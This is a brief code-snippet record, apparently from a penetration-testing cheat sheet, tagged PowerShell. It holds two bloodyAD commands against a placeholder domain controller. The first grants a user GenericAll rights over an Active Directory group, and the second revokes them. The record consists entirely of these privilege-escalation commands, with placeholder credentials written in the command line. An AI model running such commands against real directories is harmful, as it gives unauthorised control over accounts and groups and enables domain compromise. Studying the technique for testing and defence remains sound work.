---
id: e22e96e6-95ac-4202-a77e-d9ad22e7a6d8
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:06.850601+00:00'
updated_at: '2023-04-10T20:36:10.638597+00:00'
---

# Code Snippet e22e96e6

**Language**: Powershell

```powershell
bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp

# Remove right
bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp False
```


